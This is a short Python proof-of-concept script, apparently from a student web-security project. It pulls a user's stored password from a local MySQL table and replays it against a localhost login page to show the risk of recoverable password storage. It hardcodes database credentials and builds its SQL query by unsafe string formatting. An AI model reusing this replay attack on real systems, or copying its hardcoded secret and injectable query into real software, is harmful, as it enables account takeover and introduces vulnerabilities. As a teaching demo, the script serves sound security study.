#!/usr/bin/python3

import pymysql
import sys
import requests


# total arguments
n = len(sys.argv)
if(n<2):
  print("Usage: %s {'secure','insecure'} username" % (sys.argv[0]))
  sys.exit(0)

subpath = sys.argv[1]
user = sys.argv[2]#"angele"#"insecure"#param1 of prog

print("---Assumption: hacker already has access to database---")
# Open database connection
db = pymysql.connect(host="localhost", user="polytech", password="#Sophia-2021*", database="polytech_web_project")

# prepare a cursor object using cursor() method
cursor = db.cursor()

# Prepare SQL query to SELECT a record from the database.
sql = "SELECT * FROM psswd0 \
    WHERE username='%s'" % (user)
try:
  # Execute the SQL command
  cursor.execute(sql)
  # Fetch a single row using fetchone() method.
  row = cursor.fetchone()
  usrnm = row[0]
  psswd = row[1]
  # Now print fetched result
  print (">>>>username = %s\n>>>>password = %s" % \
        (usrnm, psswd))
  print("-------------------------------------------------------\n")
  target = "http://localhost/project/psswd0/%s/login.php" % (subpath)
  #+try to login with psswd... (won't work like that if salted-hashed...)
  r = requests.post(target, data={"username": user, "psswd": psswd})
  print("[*] PoC (Login html page):")
  print(r.text)
except:
  print ("Error: unable to fetch data")
  print("[*] Attack failed")
  sys.exit(0)

# disconnect from server
db.close()